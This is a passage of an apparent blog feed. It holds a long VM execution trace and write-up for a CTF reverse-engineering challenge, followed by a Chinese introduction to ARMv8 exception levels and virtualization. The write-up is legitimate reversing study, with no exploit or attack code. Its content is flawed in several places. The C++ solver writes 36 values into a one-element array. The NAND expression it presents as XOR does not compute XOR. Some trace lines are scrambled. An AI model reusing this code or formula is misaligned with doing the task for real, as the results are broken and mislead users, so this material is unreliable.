v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (1)
c = v14
dword_6010A4 = -49 ; c = 49
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-2)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -2
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (1)
v14 = v1[320] (1)
c = v14
v13 = v1[150] (49)
c += v13
v10 = c(290)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[290] = v12 (1)
v10 = v1[320] (49)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (50)
v15 = &amp;v1[325] (14)
--*v15
v14 = v1[320] (2)
c = v14
v10 = c(50)
dword_6010A4 = v10
v13 = v1[92] (50)
c += v13
v6 = c
v14 = v1[291] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 50 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (2)
c = v14
dword_6010A4 = -49 ; c = 50
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-3)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -3
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (2)
v14 = v1[320] (2)
c = v14
v13 = v1[150] (50)
c += v13
v10 = c(291)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[291] = v12 (2)
v10 = v1[320] (50)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (51)
v15 = &amp;v1[325] (13)
--*v15
v14 = v1[320] (3)
c = v14
v10 = c(51)
dword_6010A4 = v10
v13 = v1[92] (51)
c += v13
v6 = c
v14 = v1[292] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 51 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (3)
c = v14
dword_6010A4 = -49 ; c = 51
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-4)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -4
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (3)
v14 = v1[320] (3)
c = v14
v13 = v1[150] (51)
c += v13
v10 = c(292)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[292] = v12 (3)
v10 = v1[320] (51)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (52)
v15 = &amp;v1[325] (12)
--*v15
v14 = v1[320] (4)
c = v14
v10 = c(52)
dword_6010A4 = v10
v13 = v1[92] (52)
c += v13
v6 = c
v14 = v1[293] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 52 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (4)
c = v14
dword_6010A4 = -49 ; c = 52
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-5)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -5
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (4)
v14 = v1[320] (4)
c = v14
v13 = v1[150] (52)
c += v13
v10 = c(293)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[293] = v12 (4)
v10 = v1[320] (52)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (53)
v15 = &amp;v1[325] (11)
--*v15
v14 = v1[320] (5)
c = v14
v10 = c(53)
dword_6010A4 = v10
v13 = v1[92] (53)
c += v13
v6 = c
v14 = v1[294] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 53 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (5)
c = v14
dword_6010A4 = -49 ; c = 53
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-6)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -6
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (5)
v14 = v1[320] (5)
c = v14
v13 = v1[150] (53)
c += v13
v10 = c(294)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[294] = v12 (5)
v10 = v1[320] (53)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (54)
v15 = &amp;v1[325] (10)
--*v15
v14 = v1[320] (6)
c = v14
v10 = c(54)
dword_6010A4 = v10
v13 = v1[92] (54)
c += v13
v6 = c
v14 = v1[295] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 54 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (6)
c = v14
dword_6010A4 = -49 ; c = 54
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-7)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -7
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (6)
v14 = v1[320] (6)
c = v14
v13 = v1[150] (54)
c += v13
v10 = c(295)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[295] = v12 (6)
v10 = v1[320] (54)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (55)
v15 = &amp;v1[325] (9)
--*v15
v14 = v1[320] (7)
c = v14
v10 = c(55)
dword_6010A4 = v10
v13 = v1[92] (55)
c += v13
v6 = c
v14 = v1[296] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 55 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (7)
c = v14
dword_6010A4 = -49 ; c = 55
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-8)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -8
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (7)
v14 = v1[320] (7)
c = v14
v13 = v1[150] (55)
c += v13
v10 = c(296)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[296] = v12 (7)
v10 = v1[320] (55)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (56)
v15 = &amp;v1[325] (8)
--*v15
v14 = v1[320] (8)
c = v14
v10 = c(56)
dword_6010A4 = v10
v13 = v1[92] (56)
c += v13
v6 = c
v14 = v1[297] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 56 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (8)
c = v14
dword_6010A4 = -49 ; c = 56
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-9)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -9
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (8)
v14 = v1[320] (8)
c = v14
v13 = v1[150] (56)
c += v13
v10 = c(297)
dword_6010A4 = v10
v14 = v1[324] )
c = v14
v8 = dword_6010A4
v12 = c
v1[297] = v12 (8)
v10 = v1[320] (56)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (57)
v15 = &amp;v1[325] (7)
--*v15
v14 = v1[320] (9)
c = v14
v10 = c(57)
dword_6010A4 = v10
v13 = v1[92] (57)
c += v13
v6 = c
v14 = v1[298] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 57 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (9)
c = v14
dword_6010A4 = -49 ; c = 57
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-10)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -10
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (9)
v14 = v1[320] (9)
c = v14
v13 = v1[150] (57)
c += v13
v10 = c(298)
dword_6010A4 = v10
v14 = v1[324] ( )
c = v14
v8 = dword_6010A4
v12 = c
v1[298] = v12 (9)
v10 = v1[320] (57)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (58)
v15 = &amp;v1[325] (6)
--*v15
v14 = v1[320] (:)
c = v14
v10 = c(58)
dword_6010A4 = v10
v13 = v1[92] (58)
c += v13
v6 = c
v14 = v1[299] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 58 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (:)
c = v14
dword_6010A4 = -49 ; c = 58
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-11)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -11
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (10)
v14 = v1[320] (:)
c = v14
v13 = v1[150] (58)
c += v13
v10 = c(299)
dword_6010A4 = v10
v14 = v1[324] (
)
c = v14
v8 = dword_6010A4
v12 = c
v1[299] = v12 (10)
v10 = v1[320] (58)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (59)
v15 = &amp;v1[325] (5)
--*v15
v14 = v1[320] (;)
c = v14
v10 = c(59)
dword_6010A4 = v10
v13 = v1[92] (59)
c += v13
v6 = c
v14 = v1[300] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 59 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (;)
c = v14
dword_6010A4 = -49 ; c = 59
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-12)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -12
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (11)
v14 = v1[320] (;)
c = v14
v13 = v1[150] (59)
c += v13
v10 = c(300)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[300] = v12 (11)
v10 = v1[320] (59)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (60)
v15 = &amp;v1[325] (4)
--*v15
v14 = v1[320] (&lt;)
c = v14
v10 = c(60)
dword_6010A4 = v10
v13 = v1[92] (60)
c += v13
v6 = c
v14 = v1[301] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 60 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (&lt;)
c = v14
dword_6010A4 = -49 ; c = 60
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-13)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -13
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (12)
v14 = v1[320] (&lt;)
c = v14
v13 = v1[150] (60)
c += v13
v10 = c(301)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[301] = v12 (12)
v10 = v1[320] (60)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (61)
v15 = &amp;v1[325] (3)
--*v15
v14 = v1[320] (=)
c = v14
v10 = c(61)
dword_6010A4 = v10
v13 = v1[92] (61)
c += v13
v6 = c
v14 = v1[302] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 61 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (=)
c = v14
dword_6010A4 = -49 ; c = 61
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-14)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -14
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (13)
v14 = v1[320] (=)
c = v14
v13 = v1[150] (61)
c += v13
v10 = c(302)
dword_6010A4 = v10
)14 = v1[324] (
c = v14
v8 = dword_6010A4
v12 = c
v1[302] = v12 (13)
v10 = v1[320] (61)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (62)
v15 = &amp;v1[325] (2)
--*v15
v14 = v1[320] (&gt;)
c = v14
v10 = c(62)
dword_6010A4 = v10
v13 = v1[92] (62)
c += v13
v6 = c
v14 = v1[303] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 62 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (&gt;)
c = v14
dword_6010A4 = -49 ; c = 62
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-15)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -15
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (14)
v14 = v1[320] (&gt;)
c = v14
v13 = v1[150] (62)
c += v13
v10 = c(303)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[303] = v12 (14)
v10 = v1[320] (62)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (63)
v15 = &amp;v1[325] (1)
--*v15
v14 = v1[320] (?)
c = v14
v10 = c(63)
dword_6010A4 = v10
v13 = v1[92] (63)
c += v13
v6 = c
v14 = v1[304] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 63 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (?)
c = v14
dword_6010A4 = -49 ; c = 63
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-16)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -16
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (15)
v14 = v1[320] (?)
c = v14
v13 = v1[150] (63)
c += v13
v10 = c(304)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[304] = v12 (15)
v10 = v1[320] (63)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (64)
v15 = &amp;v1[325] (0)
v14 = v1[326] ()
c = v14
v13 = v1[188] (31)
c += v13
v6 = c
v14 = v1[36] (  )
c = v14
v10 = c(9)
dword_6010A4 = v10
v14 = v1[326] ()
c = v14
v13 = v1[200] (31)
c += v13
v6 = c
v14 = v1[304] ()
c = v14
__dword_6010A4 = 9     c = 15
v14 = c - dword_6010A4
c = v14
v10 =v1[353] (336)
dword_6010A4 = v10
dword_6010A4++
v14 = v1[337] (W)
c = v14
output:
Wv15 = &amp;v1[336] (5)
--*v15
dword_6010A4++
v14 = v1[338] (r)
c = v14
output:
rv15 = &amp;v1[336] (4)
--*v15
dword_6010A4++
v14 = v1[339] (o)
c = v14
output:
ov15 = &amp;v1[336] (3)
--*v15
dword_6010A4++
v14 = v1[340] (n)
c = v14
output:
nv15 = &amp;v1[336] (2)
--*v15
dword_6010A4++
v14 = v1[341] (g)
c = v14
output:
gv15 = &amp;v1[336] (1)
--*v15
dword_6010A4++
v14 = v1[342] (
)
c = v14
output:

v15 = &amp;v1[336] (0)
return
0
</code></pre>
<p>To analyze what it did, we can start from how it print and read. From testing, it read 32 characters(which is the length of flag). And we know that the input is store in v1[273] ~ v1[304]. It’s basicly a NAND machine. From what we got after stimulate the program, we can see 32 ‘blocks’ and each blocks got four <code>NAND</code>.</p>
<p><img src="/2023/03/03/VM/blocks.png" alt="VM"></p>
<h5 id="That’s-what-we-got"><a href="#That’s-what-we-got" class="headerlink" title="That’s what we got:"></a>That’s what we got:</h5><pre><code>d_1 = ((a nand b) nand b) nand ((a nand b) nand b) 
</code></pre>
<p>All of them make <code>xor</code>. Go back to the main vm_run function, here’s what the rest of the case do:</p>
<p><img src="/2023/03/03/VM/1.png" alt="VM"><br><img src="/2023/03/03/VM/2.png" alt="VM"></p>
<h5 id="So-dynamic-debugger-to-dump-the-array-v1-and-the-script"><a href="#So-dynamic-debugger-to-dump-the-array-v1-and-the-script" class="headerlink" title="So dynamic debugger to dump the array v1 and the script:"></a>So dynamic debugger to dump the array <code>v1</code> and the script:</h5><pre><code class="cpp">#include&lt;bits/stdc++.h&gt;
using namespace std;
int main()&#123;
    int a[]=&#123;1, 48, 0, 0, 0, 16, 24, 67, 20, 21, 71, 64, 23, 16, 29, 75, 18, 31, 73, 72, 24, 83, 84, 1, 87, 81, 83, 5, 86, 90, 8, 88, 95, 10, 12, 88, 9, 0, 1, 2, 3, 4, 5, 6, 0, 0, 0, 0, 21, 0, 1, 0, 0, 14, 18, 11, 12, 0, 1, 0, 0, 53, 0, 0, 0, 102, 21, 16, 1, 0, 0, 14, 10, 102, 22, 12, 16, 1, 0, 0, 71, 0, 0, 0, 102, 3, 64, 1, 0, 0, 16, 17, 241, 0, 0, 0, 19, 4, 67, 1, 0, 0, 8, 4, 65, 1, 0, 0, 16, 3, 64, 1, 0, 0, 8, 4, 66, 1, 0, 0, 3, 65, 1, 0, 0, 3, 67, 1, 0, 0, 8, 16, 3, 66, 1, 0, 0, 8, 4, 68, 1, 0, 0, 102, 3, 64, 1, 0, 0, 17, 241, 0, 0, 0, 16, 3, 68, 1, 0, 0, 22, 5, 64, 1, 0, 0, 14, 6, 64, 1, 0, 0, 12, 69, 1, 0, 0, 85, 0, 0, 0, 102, 3, 70, 1, 0, 0, 17, 5, 0, 0, 0, 19, 16, 3, 70, 1, 0, 0, 17, 17, 1, 0, 0, 19, 23, 24, 96, 1, 0, 0, 12, 70, 1, 0, 0, 182, 0, 0, 0, 1, 118, 1, 0, 0, 102, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 73, 110, 112, 117, 116, 32, 70, 108, 97, 103, 58, 0, 0, 0, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 52, 53, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 245, 202, 10, 53, 0, 31, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 87, 114, 111, 110, 103, 10, 82, 105, 103, 104, 116, 10, 0, 0, 0, 21, 80, 1, 0, 0, 14, 18, 11, 12, 80, 1, 0, 0, 101, 1, 0, 0, 0, 0, 0, 0, 0, 21, 86, 1, 0, 0, 14, 18, 11, 12, 80, 1, 0, 0, 123, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&#125;;
    int b[32]=&#123;0&#125;;
    int flag[]=&#123;0&#125;;
    for (int i=0;i&lt;36;i++)&#123;
        flag[i]=(i+32)^a[i+5];
    &#125;
    for (int i=0;i&lt;32;i++)&#123;
        cout&lt;&lt;(char)flag[i];
    &#125;
&#125;
</code></pre>
<p><img src="/2023/03/03/VM/3.png" alt="3"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>arm初探</title>
    <url>/2023/11/29/arm%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：之前猜猜查查的，感觉不彳亍了，这下不得不和arm爆了！"><a href="#PREFACE：之前猜猜查查的，感觉不彳亍了，这下不得不和arm爆了！" class="headerlink" title="PREFACE：之前猜猜查查的，感觉不彳亍了，这下不得不和arm爆了！"></a>PREFACE：之前猜猜查查的，感觉不彳亍了，这下不得不和arm爆了！</h6><span id="more"></span>

<h3 id="架构介绍"><a href="#架构介绍" class="headerlink" title="架构介绍"></a>架构介绍</h3><p><img src="/2023/11/29/arm%E5%88%9D%E6%8E%A2/V5_to_V8_Architecture.jpg" alt="img"></p>
<p><img src="/2023/11/29/arm%E5%88%9D%E6%8E%A2/evolution_arm_arch.png" alt="img"></p>
<h5 id="架构层级"><a href="#架构层级" class="headerlink" title="架构层级"></a>架构层级</h5><ul>
<li>EL0: 无特权模式(unprivileged)</li>
<li>EL1: 作业系統核心模式(OS kernel mode)</li>
<li>EL2: 虚拟机器监视器模式(Hypervisor mode)</li>
<li>EL3: TrustZone(monitor mode)</li>
</ul>
<p>要提升到较高层级需要透过exceptions(如: 中断、page faults等)。</p>
<ul>
<li>EL0 &#x3D;&gt; EL1: SVC (system call)</li>
<li>EL1 &#x3D;&gt; EL2: HVC (hypervisor call)</li>
<li>EL2 &#x3D;&gt; EL3: SMC (secure monitor call)</li>
</ul>
<p>在转换时会将返回地址(return address)记录在例外连结寄存器ELR(Exception-Link-Register)。</p>
<p>每个EL会有个别的SP(stack pointer)</p>
<p>根据目前架构，由下层系統的Execution State決定上层系统所在模式</p>
<p>若下层系統为32bits則上层只能为32bits，反之若为64bits則上层可为32bits or 64bits</p>
<h5 id="安全性状态-Security-state"><a href="#安全性状态-Security-state" class="headerlink" title="安全性状态 (Security state)"></a>安全性状态 (Security state)</h5><p>ARMv8-A架构提供两种安全性状态，他们有个别的实体记忆体定址空间(Secure physical address space)。</p>
<p>安全状态(Secure state): PE可以存取安全及不安全的实体定址空间，有EL0.EL1.EL3</p>
<p>不安全状态(Non-Secure state): 只能存取不安全的实体定址空间，有EL0.EL1.EL2</p>
<h5 id="虚拟化-Virtualization"><a href="#虚拟化-Virtualization" class="headerlink" title="虚拟化 (Virtualization)"></a>虚拟化 (Virtualization)</h5><p> 这边提到的虚拟化为有实现EL2架构的系统。以下为其基础模型: (manual D1.5 Virtualization)</p>
<p>一个跑在EL2的Hypervisor负责切换跑在EL1、EL0的virtual machines 一些跑在virtual machines上(在EL1中)的Guest OS 每个Guest OS上跑在EL0的应用程序 每个VM会被Hypervisor指定一个VMID。</p>
<p>EL2只会实现在 Non-secure state，并负责:</p>
<p>提供虚拟值给少数特定的暂存器(1)。Guest OS 或其上的应用程序读取这些暂存器时会得到虚拟的值。 Trapping: 当在做记忆体管理及存取其他大多数的暂存器((1)之外的)时会产生exception并由EL2处理。 Routing interrupt: 将中断分配给 现在的Guest OS 现在没在执行的Guest OS hypervisor (以上会在各别的章节特别探讨) 实现EL2包含以下实作:</p>
<p>Hypervisor Call (HVC) exception Traps to EL2 虚拟中断: 包括: Virtual SError Virtual IRQ Virtual FIQ 所有虚拟中断会由EL1处理 每个虚拟中断可由EL2各别启用 每个虚拟中断都会有其对应的实体中断 当一个虚拟中断被启用时，其对应的实体中断会由EL2处理(除非EL3指定他要处理)</p>
<p>偷了个，基本上简单入门够了</p>
